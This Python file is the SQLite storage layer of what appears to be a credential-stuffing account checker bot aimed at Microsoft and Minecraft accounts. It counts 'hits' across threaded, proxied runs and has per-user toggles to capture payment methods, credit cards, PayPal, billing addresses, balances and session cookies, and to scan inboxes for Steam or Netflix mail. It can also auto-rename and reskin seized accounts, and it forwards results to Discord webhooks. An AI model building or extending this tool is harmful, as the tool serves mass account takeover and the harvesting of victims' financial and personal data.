import sqlite3
import threading
import collections

# Named tuple for settings row — field names match column names exactly
_SETTINGS_FIELDS = [
    'user_id',
    'hit_notifications', 'result_type', 'file_format', 'threads',
    # capture module toggles
    'cap_hypixel_stats', 'cap_hypixel_plancke', 'cap_ban_check',
    'cap_optifine_cape', 'cap_name_change', 'cap_email_access',
    'cap_ms_balance', 'cap_rewards_points', 'cap_payment_methods',
    'cap_billing_address', 'cap_subscriptions', 'cap_donut_stats',
    'cap_inbox_scan', 'cap_buddy_pass', 'cap_save_cookies',
    'cap_auto_name', 'cap_auto_skin',
    # configuration values
    'inbox_keywords',
    'discord_webhook_hits', 'discord_webhook_2fa',
    'discord_webhook_xbox', 'discord_webhook_other',
    'discord_embed_mode',
    'auto_name_format', 'auto_skin_url', 'auto_skin_variant',
    'donut_api_key',
    'auto_proxy', 'proxy_refresh_minutes',
]
SettingsRow = collections.namedtuple('SettingsRow', _SETTINGS_FIELDS)

# New settings columns with their SQL default values (for ALTER TABLE migration)
_NEW_SETTINGS_COLUMNS = [
    ('cap_hypixel_stats',    'INTEGER DEFAULT 1'),
    ('cap_hypixel_plancke',  'INTEGER DEFAULT 1'),
    ('cap_ban_check',        'INTEGER DEFAULT 1'),
    ('cap_optifine_cape',    'INTEGER DEFAULT 1'),
    ('cap_name_change',      'INTEGER DEFAULT 1'),
    ('cap_email_access',     'INTEGER DEFAULT 1'),
    ('cap_ms_balance',       'INTEGER DEFAULT 0'),
    ('cap_rewards_points',   'INTEGER DEFAULT 1'),
    ('cap_payment_methods',  'INTEGER DEFAULT 0'),
    ('cap_billing_address',  'INTEGER DEFAULT 0'),
    ('cap_subscriptions',    'INTEGER DEFAULT 0'),
    ('cap_donut_stats',      'INTEGER DEFAULT 1'),
    ('cap_inbox_scan',       'INTEGER DEFAULT 0'),
    ('cap_buddy_pass',       'INTEGER DEFAULT 1'),
    ('cap_save_cookies',     'INTEGER DEFAULT 0'),
    ('cap_auto_name',        'INTEGER DEFAULT 0'),
    ('cap_auto_skin',        'INTEGER DEFAULT 0'),
    ('inbox_keywords',       "TEXT DEFAULT 'Steam,Netflix,Xbox,Microsoft'"),
    ('discord_webhook_hits', "TEXT DEFAULT ''"),
    ('discord_webhook_2fa',  "TEXT DEFAULT ''"),
    ('discord_webhook_xbox', "TEXT DEFAULT ''"),
    ('discord_webhook_other',"TEXT DEFAULT ''"),
    ('discord_embed_mode',   'INTEGER DEFAULT 1'),
    ('auto_name_format',     "TEXT DEFAULT 'Bot_{random_letter}_{random_number}'"),
    ('auto_skin_url',        "TEXT DEFAULT ''"),
    ('auto_skin_variant',    "TEXT DEFAULT 'classic'"),
    ('donut_api_key',        "TEXT DEFAULT ''"),
    ('auto_proxy',           'INTEGER DEFAULT 0'),
    ('proxy_refresh_minutes','INTEGER DEFAULT 5'),
]

_ALLOWED_SETTINGS_KEYS = {
    'hit_notifications', 'result_type', 'file_format', 'threads',
    'cap_hypixel_stats', 'cap_hypixel_plancke', 'cap_ban_check',
    'cap_optifine_cape', 'cap_name_change', 'cap_email_access',
    'cap_ms_balance', 'cap_rewards_points', 'cap_payment_methods',
    'cap_billing_address', 'cap_subscriptions', 'cap_donut_stats',
    'cap_inbox_scan', 'cap_buddy_pass', 'cap_save_cookies',
    'cap_auto_name', 'cap_auto_skin',
    'inbox_keywords',
    'discord_webhook_hits', 'discord_webhook_2fa',
    'discord_webhook_xbox', 'discord_webhook_other',
    'discord_embed_mode',
    'auto_name_format', 'auto_skin_url', 'auto_skin_variant',
    'donut_api_key',
    'auto_proxy', 'proxy_refresh_minutes',
}


class Database:
    def __init__(self, db_name='bot_database.db'):
        self.db_name = db_name
        self.lock = threading.Lock()
        self.init_db()

    def get_connection(self):
        conn = sqlite3.connect(self.db_name)
        conn.row_factory = sqlite3.Row
        return conn

    def init_db(self):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()

            # Users table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    full_name TEXT,
                    role TEXT DEFAULT 'pending',
                    joined_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            # Settings table (base columns)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    user_id INTEGER PRIMARY KEY,
                    hit_notifications INTEGER DEFAULT 1,
                    result_type TEXT DEFAULT 'all',
                    file_format TEXT DEFAULT 'txt',
                    threads INTEGER DEFAULT 5,
                    FOREIGN KEY (user_id) REFERENCES users (user_id)
                )
            ''')

            # Migrate: add new columns if they don't exist yet
            existing_cols = {row[1] for row in cursor.execute("PRAGMA table_info(settings)")}
            for col_name, col_def in _NEW_SETTINGS_COLUMNS:
                if col_name not in existing_cols:
                    cursor.execute(f'ALTER TABLE settings ADD COLUMN {col_name} {col_def}')

            # Stats table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS stats (
                    user_id INTEGER PRIMARY KEY,
                    total_checked INTEGER DEFAULT 0,
                    hits INTEGER DEFAULT 0,
                    bad INTEGER DEFAULT 0,
                    errors INTEGER DEFAULT 0,
                    FOREIGN KEY (user_id) REFERENCES users (user_id)
                )
            ''')

            # Global stats table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS global_stats (
                    id INTEGER PRIMARY KEY CHECK (id = 0),
                    total_checked INTEGER DEFAULT 0,
                    hits INTEGER DEFAULT 0,
                    bad INTEGER DEFAULT 0,
                    errors INTEGER DEFAULT 0
                )
            ''')

            # Bot config table (for admin-adjustable global settings)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bot_config (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            ''')
            cursor.execute("INSERT OR IGNORE INTO bot_config (key, value) VALUES ('max_concurrent', '3')")

            cursor.execute('INSERT OR IGNORE INTO global_stats (id) VALUES (0)')
            conn.commit()
            conn.close()

    # ------------------------------------------------------------------ users

    def get_user(self, user_id):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
            user = cursor.fetchone()
            conn.close()
            return user

    def add_user(self, user_id, username, full_name, role='pending'):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute(
                'INSERT OR IGNORE INTO users (user_id, username, full_name, role) VALUES (?, ?, ?, ?)',
                (user_id, username, full_name, role)
            )
            cursor.execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (user_id,))
            cursor.execute('INSERT OR IGNORE INTO stats (user_id) VALUES (?)', (user_id,))
            conn.commit()
            conn.close()

    def update_user_role(self, user_id, role):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('UPDATE users SET role = ? WHERE user_id = ?', (role, user_id))
            conn.commit()
            conn.close()

    def get_all_users(self):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('SELECT user_id, username, role FROM users')
            users = cursor.fetchall()
            conn.close()
            return users

    def get_all_authorized_users(self):
        """Return user_ids of all authorized/admin users."""
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute("SELECT user_id FROM users WHERE role IN ('authorized', 'admin')")
            rows = cursor.fetchall()
            conn.close()
            return [r[0] for r in rows]

    # --------------------------------------------------------------- settings

    def get_settings(self, user_id) -> SettingsRow:
        """Return a SettingsRow namedtuple for the given user."""
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute(
                f"SELECT {', '.join(_SETTINGS_FIELDS)} FROM settings WHERE user_id = ?",
                (user_id,)
            )
            row = cursor.fetchone()
            conn.close()
            if row is None:
                return None
            return SettingsRow(*row)

    def update_settings(self, user_id, **kwargs):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            for key, value in kwargs.items():
                if key in _ALLOWED_SETTINGS_KEYS:
                    cursor.execute(
                        f'UPDATE settings SET {key} = ? WHERE user_id = ?',
                        (value, user_id)
                    )
            conn.commit()
            conn.close()

    def get_user_capture_config(self, user_id) -> dict:
        """
        Return a config dict mapping capture module keys to their enabled state
        and configuration values. Keys match what capture modules expect via
        config.get(...).
        """
        s = self.get_settings(user_id)
        if s is None:
            return {}
        return {
            # capture toggles
            'hypixel_stats':        bool(s.cap_hypixel_stats),
            'hypixelname':          bool(s.cap_hypixel_plancke),
            'hypixellevel':         bool(s.cap_hypixel_plancke),
            'hypixelfirstlogin':    bool(s.cap_hypixel_plancke),
            'hypixellastlogin':     bool(s.cap_hypixel_plancke),
            'hypixelbwstars':       bool(s.cap_hypixel_plancke),
            'cap_ban_check':        bool(s.cap_ban_check),
            'hypixelban':           bool(s.cap_ban_check),
            'optifinecape':         bool(s.cap_optifine_cape),
            'namechange':           bool(s.cap_name_change),
            'lastchanged':          bool(s.cap_name_change),
            'cap_email_access':     bool(s.cap_email_access),
            'access':               bool(s.cap_email_access),
            'check_microsoft_balance': bool(s.cap_ms_balance),
            'check_rewards_points': bool(s.cap_rewards_points),
            'check_payment':        bool(s.cap_payment_methods),
            'check_payment_methods':bool(s.cap_payment_methods),
            'check_credit_cards':   bool(s.cap_payment_methods),
            'check_paypal':         bool(s.cap_payment_methods),
            'check_billing_address':bool(s.cap_billing_address),
            'cap_subscriptions':    bool(s.cap_subscriptions),
            'donut_stats':          bool(s.cap_donut_stats),
            'cap_inbox_scan':       bool(s.cap_inbox_scan),
            'cap_buddy_pass':       bool(s.cap_buddy_pass),
            'cap_save_cookies':     bool(s.cap_save_cookies),
            'cap_auto_name':        bool(s.cap_auto_name),
            'cap_auto_skin':        bool(s.cap_auto_skin),
            # configuration values
            'inbox_keywords':       s.inbox_keywords or 'Steam,Netflix,Xbox,Microsoft',
            'discord_webhook_hits': s.discord_webhook_hits or '',
            'discord_webhook_2fa':  s.discord_webhook_2fa or '',
            'discord_webhook_xbox': s.discord_webhook_xbox or '',
            'discord_webhook_other':s.discord_webhook_other or '',
            'discord_embed_mode':   bool(s.discord_embed_mode),
            'auto_name_format':     s.auto_name_format or 'Bot_{random_letter}_{random_number}',
            'auto_skin_url':        s.auto_skin_url or '',
            'auto_skin_variant':    s.auto_skin_variant or 'classic',
            'donut_api_key':        s.donut_api_key or '',
            'auto_proxy':           bool(s.auto_proxy),
            'proxy_refresh_minutes':int(s.proxy_refresh_minutes or 5),
            # pass-through for engine
            'hit_notifications':    bool(s.hit_notifications),
            'result_type':          s.result_type or 'all',
            'file_format':          s.file_format or 'txt',
            'threads':              min(int(s.threads or 5), 20),
            'timeout':              15,
            'max_retries':          3,
        }

    # ------------------------------------------------------------------ stats

    def update_stats(self, user_id, hits=0, bad=0, errors=0):
        total = hits + bad + errors
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE stats
                SET total_checked = total_checked + ?,
                    hits = hits + ?,
                    bad = bad + ?,
                    errors = errors + ?
                WHERE user_id = ?
            ''', (total, hits, bad, errors, user_id))
            cursor.execute('''
                UPDATE global_stats
                SET total_checked = total_checked + ?,
                    hits = hits + ?,
                    bad = bad + ?,
                    errors = errors + ?
                WHERE id = 0
            ''', (total, hits, bad, errors))
            conn.commit()
            conn.close()

    def get_user_stats(self, user_id):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM stats WHERE user_id = ?', (user_id,))
            stats = cursor.fetchone()
            conn.close()
            return stats

    def get_global_stats(self):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM global_stats WHERE id = 0')
            stats = cursor.fetchone()
            conn.close()
            return stats

    # ------------------------------------------------------------ bot config

    def get_bot_config(self, key, default=None):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('SELECT value FROM bot_config WHERE key = ?', (key,))
            row = cursor.fetchone()
            conn.close()
            return row[0] if row else default

    def set_bot_config(self, key, value):
        with self.lock:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute(
                'INSERT OR REPLACE INTO bot_config (key, value) VALUES (?, ?)',
                (key, str(value))
            )
            conn.commit()
            conn.close()
